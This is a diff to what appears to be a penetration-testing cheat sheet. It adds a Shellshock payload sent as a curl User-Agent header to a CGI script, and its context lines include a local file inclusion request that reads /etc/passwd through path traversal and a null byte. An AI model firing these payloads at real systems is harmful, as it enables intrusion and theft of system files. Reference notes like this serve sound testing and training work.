@@ -551,6 +551,9 @@ Authentication
 
     curl "https://1.1.1.1/section.php?cmd=cat%20/etc/passwd&page=../../../../../proc/self/fd/10%00"
 
+Shellshock
+
+    curl http://1.1.1.1/cgi-bin/admin.cgi -H"User-Agent:() { :; }; /bin/bash -c ifconfig “
 <h4>SQL Injection </h4>
 
 
@@ -619,11 +622,10 @@ Other Resources
 
 <div id="LessonsLearned"> <h3>11. Lessons Learned</h3></div>
 
-Things to keep in mind
 <ul>
   <li>Always Review Source Code</li>
   <li>Check Sudo Version </li>
   <li>In most cases RFI vulns can be used as LFIs too</li>
-  <li>In most cases LFIs can be used to read arbitrary files on the system. </li>
+  <li>In most cases LFIs can be used to read arbitrary files on the system </li>
 </ul>
  
